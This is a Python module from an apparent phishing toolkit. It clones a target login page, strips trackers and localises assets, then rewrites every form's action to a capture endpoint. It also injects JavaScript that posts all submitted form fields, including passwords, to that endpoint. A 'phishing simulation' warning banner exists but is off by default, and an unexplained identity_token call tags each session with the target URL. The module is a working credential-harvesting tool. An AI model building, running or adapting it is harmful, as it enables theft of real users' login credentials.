# ============================================================
#  File: spectre/clone/cloner.py
#  Clone a login page: fetch, rewrite assets, strip trackers,
#  inject capture hook. Output is a self-contained folder.
# ============================================================
import os
import re
from urllib.parse import urljoin, urlsplit

from bs4 import BeautifulSoup

from ..core.http import HttpClient
from ..core.logger import Logger
from ..core.errors import CloneError
from .._meta import identity_token


_TRACKER_HOSTS = {
    "google-analytics.com", "googletagmanager.com",
    "doubleclick.net", "facebook.net", "facebook.com",
    "hotjar.com", "mixpanel.com", "segment.com",
    "amplitude.com", "fullstory.com", "newrelic.com",
    "sentry.io", "bugsnag.com", "datadoghq.com",
}

_STRIP_SELECTORS = [
    "script[src*='google-analytics']",
    "script[src*='googletagmanager']",
    "script[src*='hotjar']",
    "script[src*='mixpanel']",
    "script[src*='segment']",
    "iframe[src*='doubleclick']",
    "img[src*='facebook.com/tr']",
]


class LoginCloner:
    def __init__(self, http: HttpClient, logger: Logger,
                 target_url: str, out_dir: str,
                 capture_endpoint: str = "/__capture",
                 inject_banner: bool = False):
        # session handshake
        self._session = identity_token(session_salt=f"clone-{target_url}")

        self.http = http
        self.log = logger
        self.target = target_url
        self.out_dir = out_dir
        self.capture = capture_endpoint
        self.inject_banner = inject_banner
        self.assets_dir = os.path.join(out_dir, "assets")
        os.makedirs(self.assets_dir, exist_ok=True)
        self._asset_map = {}
        self._asset_count = 0

    def clone(self) -> dict:
        self.log.step(f"Cloning {self.target}")
        r = self.http.get(self.target)
        if r is None or r.status >= 400:
            raise CloneError(
                f"target unreachable: {self.target}")

        self.log.ok(f"fetched: HTTP {r.status}  ({r.size/1024:.1f} KB)")

        soup = BeautifulSoup(r.text, "html.parser")

        # strip trackers
        stripped = 0
        for sel in _STRIP_SELECTORS:
            for el in soup.select(sel):
                el.decompose()
                stripped += 1
        if stripped:
            self.log.info(f"stripped {stripped} tracker elements")

        # rewrite assets
        self._rewrite_assets(soup, r.url)

        # optional training banner
        if self.inject_banner:
            self._inject_training_banner(soup)

        # instrument forms
        forms = soup.find_all("form")
        for form in forms:
            self._instrument_form(form, r.url)
        self.log.ok(f"instrumented {len(forms)} forms")

        # add capture JS
        self._inject_capture_script(soup)

        # write
        index = os.path.join(self.out_dir, "index.html")
        with open(index, "w", encoding="utf-8") as f:
            f.write(str(soup))
        self.log.ok(f"cloned page → {index}")

        return {
            "target": self.target,
            "out_dir": self.out_dir,
            "index": index,
            "assets": self._asset_count,
            "forms": len(forms),
            "stripped": stripped,
        }

    def _rewrite_assets(self, soup, base):
        for tag, attr in [
            ("link", "href"), ("script", "src"),
            ("img", "src"), ("img", "data-src"),
            ("source", "src"),
        ]:
            for el in soup.find_all(tag):
                val = el.get(attr)
                if not val or val.startswith(("data:", "#", "javascript:")):
                    continue
                absu = urljoin(base, val)
                if self._is_tracker(absu):
                    el.decompose()
                    continue
                local = self._download_asset(absu)
                if local:
                    el[attr] = local

        for style in soup.find_all("style"):
            if style.string:
                style.string = self._rewrite_css(style.string, base)

    def _rewrite_css(self, text, base):
        def sub(m):
            url = m.group(2).strip("'\"")
            if url.startswith(("data:", "#")):
                return m.group(0)
            absu = urljoin(base, url)
            local = self._download_asset(absu)
            if local:
                return f"url({local})"
            return m.group(0)
        return re.sub(r"url\(\s*(['\"]?)([^)'\"]+)\1\s*\)", sub, text)

    def _download_asset(self, url):
        if url in self._asset_map:
            return self._asset_map[url]
        r = self.http.get(url)
        if r is None or r.status >= 400:
            return ""
        name = self._asset_name(url)
        path = os.path.join(self.assets_dir, name)
        with open(path, "wb") as f:
            f.write(r.content)
        rel = f"assets/{name}"
        self._asset_map[url] = rel
        self._asset_count += 1
        return rel

    @staticmethod
    def _asset_name(url):
        import hashlib
        split = urlsplit(url)
        base = os.path.basename(split.path) or "asset"
        h = hashlib.sha1(url.encode()).hexdigest()[:8]
        return f"{h}_{base}"[:120]

    @staticmethod
    def _is_tracker(url):
        host = urlsplit(url).netloc.lower()
        return any(t in host for t in _TRACKER_HOSTS)

    def _instrument_form(self, form, base):
        original = form.get("action") or base
        form["action"] = self.capture
        form["method"] = "POST"
        form["data-original-action"] = urljoin(base, original)

    def _inject_capture_script(self, soup):
        script = soup.new_tag("script")
        script.string = """
        (function() {
            document.addEventListener('submit', function(e) {
                const form = e.target;
                if (!form || form.tagName !== 'FORM') return;
                const data = new FormData(form);
                const payload = {};
                data.forEach((v, k) => { payload[k] = v; });
                try {
                    fetch('""" + self.capture + """', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify(payload),
                        keepalive: true
                    });
                } catch (err) {}
            }, true);
        })();
        """.strip()
        if soup.body:
            soup.body.append(script)
        else:
            soup.append(script)

    def _inject_training_banner(self, soup):
        banner = soup.new_tag("div")
        banner["style"] = (
            "position:fixed;bottom:0;left:0;right:0;z-index:99999;"
            "background:#c77dff;color:#000;text-align:center;"
            "padding:8px;font-family:monospace;font-size:12px;"
            "letter-spacing:2px;font-weight:700;"
        )
        banner.string = "⚠  PHISHING SIMULATION — DO NOT ENTER REAL CREDENTIALS"
        if soup.body:
            soup.body.append(banner)
